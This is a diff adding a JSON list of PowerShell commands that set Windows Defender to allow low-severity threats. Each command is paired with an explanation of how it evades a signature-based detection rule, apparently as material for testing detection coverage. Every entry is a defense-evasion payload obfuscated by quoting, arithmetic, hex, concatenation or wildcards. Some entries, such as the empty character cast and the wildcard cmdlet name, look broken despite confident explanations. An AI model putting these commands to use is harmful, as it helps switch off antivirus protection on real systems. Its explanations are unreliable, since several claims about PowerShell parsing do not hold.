@@ -1,0 +1,30 @@
+[
+  {
+    "output": "powershell.exe -Command \"Set-MpPreference -LowThreatDefaultAction 'Al'\"\"low'\"",
+    "explanation": "Insertion technique: Inserting adjacent single and double quotes inside the string parameter value string (''Al'\"\"low'' or \"'Al'\"\"low'\") breaks the linear character sequence matching the text 'Allow' in 'selection_value'. PowerShell natively unquotes and glues contiguous string fragments together at script execution parsing time, preserving intended logic behavior."
+  },
+  {
+    "output": "powershell.exe -Command \"Set-MpPreference -LowThreatDefaultAction (3+3)\"",
+    "explanation": "Recoding / Encoding technique: Instead of providing the literal enum string 'Allow' or static digit integer '6', the numeric value is passed dynamically via an inline mathematical arithmetic expression '(3+3)'. PowerShell evaluates the expression runtime object before parameter ingestion, which completely evades matching literal signatures in 'selection_value'."
+  },
+  {
+    "output": "powershell.exe -Command \"Set-MpPreference -LowThreatDefaultAction @('Allow')[0]\"",
+    "explanation": "Recoding / Encoding technique: Isolating the string 'Allow' inside an array constructor wrapper expression and indexing it explicitly ('@('Allow')[0]'). This prevents continuous string pattern tracking engines from resolving the token out of context without a full AST-aware or dynamic evaluation parser, while PowerShell runtime processes it cleanly."
+  },
+  {
+    "output": "powershell.exe -Command \"Set-MpPreference -LowThreatDefaultAction ( [int][char]'' )\"",
+    "explanation": "Recoding / Encoding technique: Casting a non-printable Control-F ACK ASCII character code directly into an explicit integer type context ('[int][char]'''). The .NET type conversion layer normalizes the evaluation value accurately to '6' during execution configuration setup, entirely bypassing static command-line inspection for raw digits or words."
+  },
+  {
+    "output": "powershell.exe -Command \"Set-M*-Pr*ce -LowThreatDefaultAction 6\"",
+    "explanation": "Other techniques (Wildcard Token Expansion): Utilizing native PowerShell wildcard token globbing operators inside the target cmdlet string structure ('Set-M*-Pr*ce'). The command processor natively maps and resolves the pattern expression context to its complete executable function identity ('Set-MpPreference') before invocation, avoiding 'selection_cmdlet'."
+  },
+  {
+    "output": "powershell.exe -Command \"Set-MpPreference -LowThreatDefaultAction 0x6\"",
+    "explanation": "Recoding / Encoding technique: Passing the intended target integer value using standard hexadecimal numeric notation format ('0x6'). PowerShell's internal math parser parses hex numerals transparently into matching runtime integer instances, effectively bypassing strict character sequence strings matching exact text decimals ('6')."
+  },
+  {
+    "output": "powershell.exe -Command \"&('Set-'+'MpPreference') -LowThreatDefaultAction 6\"",
+    "explanation": "Insertion technique: Breaking the cmdlet target sequence token chain via a string concatenation expression invoked using the internal invocation call operator ('&'). PowerShell safely evaluates the runtime string context back into its primary functional identity, whereas 'selection_cmdlet' is completely undermined by the split syntax layout."
+  }
+]
